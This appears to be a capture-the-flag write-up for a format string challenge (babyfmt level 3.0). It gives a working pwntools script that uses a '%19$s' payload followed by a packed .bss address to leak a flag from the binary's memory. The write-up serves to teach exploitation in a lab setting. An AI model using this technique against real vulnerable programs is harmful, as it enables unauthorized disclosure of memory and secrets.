# Format String Exploits 3.0

Running the provided executable file, we are tasked to leak the flag hidden inside the `.bss` segment of the file with the given address. 

First, we load the library and files used then start the process.

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyfmt_level3.0")

io = process()
```

Then we parse the given address

```python
io.recvuntil(b'you want is 0x')
bss_address = p64(int(io.recv(6), 16))
```

Since we are given the address, we can pass the address value into the stack, then read the string pointed using `%n$s`. Using the `%p %p %p ... %p`, we found the buffer is situated in `%18$p`.

Now, since the address starts with `\x00`, we must put the format exploit before the string to prevent null-terminated input (since `printf` prints until `\x00` is found). So, we want the payload to be

```txt
  0011223344556677
|                  | ...
| 0000000000400000 | 19 (.bss address leak)
| % 1 9 $ s . . .  | 18 (format string)
```

Final payload:

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyfmt_level3.0")

io = process()

print("===== STARTING EXPLOIT =====")

io.recvuntil(b'you want is 0x')
bss_address = p64(int(io.recv(6), 16))

payload = b'%19$s||' + bss_address

io.sendline(payload)

io.recvuntil(b'data!\n\n')

print(f'Flag: {io.recvline(False)}')
```

Flag:

![[Format String Exploits/images/Level3.0.png]]